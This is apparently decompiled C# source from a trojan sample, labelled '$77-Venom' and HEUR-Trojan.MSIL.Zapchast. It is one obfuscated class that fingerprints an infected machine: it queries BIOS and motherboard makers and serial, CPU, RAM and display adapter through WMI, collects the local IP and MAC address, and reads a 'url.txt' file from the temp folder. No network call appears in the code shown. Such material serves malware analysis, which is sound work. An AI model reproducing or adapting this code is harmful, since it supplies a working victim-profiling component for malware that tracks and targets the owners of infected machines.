// Decompiled with JetBrains decompiler
// Type: 熒㚘㼃鯚ꎷ４콟꩕ꎃ颐ㅓ蘫ꌮ໨�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;

public static class \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD
{
  public static string HardwareId { get; private set; }

  static \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD() => \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.HardwareId = 䋃组紳ᵈ蝥땝\uE594敞㚶着솢圴\uE8A7崒乢ꯣ䒶릵蘘累.\u096C령넊紅칻銥䈻߲㮱ֶ蕮됇ၠ멮ꯞ垯\uFFFD\uF73B慸州(\uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.瘎酙ᛆ㭛耶悎涢吷䧟蹆\uECD6ᅀ㲏\uF01A\uF70D䎈謑䰕㯾㧔() + \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.悬\uFBB3啦喂쐻홓薀\uAAD3\uF8FA燕\uF246宙㞗鲀\u22B5衜饈㺋隨쿚() + \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.魼謁\uF3CC\u2A6D䎨\u2191ꢙ츛㵓쵸㷗㘳䙨ꉻﰢ徴\u339Bꤋ䰿쾁());

  public static string 魼謁\uF3CC\u2A6D䎨\u2191ꢙ츛㵓쵸㷗㘳䙨ꉻﰢ徴\u339Bꤋ䰿쾁()
  {
    try
    {
      string empty = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            empty = enumerator.Current["Manufacturer"].ToString();
        }
      }
      return !string.IsNullOrEmpty(empty) ? empty : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string 悬\uFBB3啦喂쐻홓薀\uAAD3\uF8FA燕\uF246宙㞗鲀\u22B5衜饈㺋隨쿚()
  {
    try
    {
      string str = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            str = current["Manufacturer"].ToString() + current["SerialNumber"].ToString();
          }
        }
      }
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string 瘎酙ᛆ㭛耶悎涢吷䧟蹆\uECD6ᅀ㲏\uF01A\uF70D䎈謑䰕㯾㧔()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Name"].ToString() + "; ";
      }
      string str = \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.瓼ऌ㰵䒓溃ᢻئণ\u205E솈ꋏꀮ㼃\uF83E潢羗莦\uFF63뙔肘(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static int 灭\uFFFD\uEB93ᷝ\u2008\u2F48쉿ᘢ\u23F7텩딷謗敲꼓弁\uF829ᮛ䲍㑉\uEAE7()
  {
    try
    {
      int num = 0;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
        }
      }
      return num;
    }
    catch
    {
      return -1;
    }
  }

  public static string 躣뾊젣\uFFFD鑫뉉\u2797ꬢ퇁\uE70A猃懝퐨\uFFFD龏䪘ﺦ叓䔫乑()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Description"].ToString() + "; ";
      }
      string str = \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.瓼ऌ㰵䒓溃ᢻئণ\u205E솈ꋏꀮ㼃\uF83E潢羗莦\uFF63뙔肘(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
      return "Unknown";
    }
  }

  public static string \uF15B\uFFFD宙哔皽宰\uED72\uFFFD㣰徶쥈ˣ\uE341論壉㟢\u002C崟꿌荞()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault<GatewayIPAddressInformation>() != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
      {
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            return unicastAddress.Address.ToString();
        }
      }
    }
    return "-";
  }

  public static string \uFFFD\uF87D穈䥓ᕱ竱\u2F0E䕏궷봞祥\uE07C\u24A6\u1AC0즬๋艴\u3244\u25A4㞡()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
      {
        bool flag = false;
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            flag = unicastAddress.Address.ToString() == \uE4DC熒\uE6EF\uE0EA㚘㼃鯚ꎷ\uE866４콟꩕ꎃ颐\uF62Dㅓ蘫ꌮ\u0EE8\uFFFD.\uF15B\uFFFD宙哔皽宰\uED72\uFFFD㣰徶쥈ˣ\uE341論壉㟢\u002C崟꿌荞();
        }
        if (flag)
          return \uF178\uFFFD䬵컫퓌ꦽ沬\u0BA2됉\uAB0F䛲葈발㮷輦漱殲\u21AC\uE705䤻.醧ኑ댦\uE995汀眇瘮ۋ᱃쪡ත兎㡥흖稪靸缚맖꿤瞍(networkInterface.GetPhysicalAddress().ToString());
      }
    }
    return "-";
  }

  public static string 룊灣卋붡ѹ븛囘숰灬쏋\u2B29\uF24B䂧䞑\u2803鷔碓\uF473\uFFFD\uEFAA()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }

  public static string 䳵\uFFFD\uE71B蟼闷\u26C9ঊ嬷ⰴ\u09F4ᗳ귎\uE3BC塏䄒ᓐ\u0BDF넣ꀏᖝ()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }
}
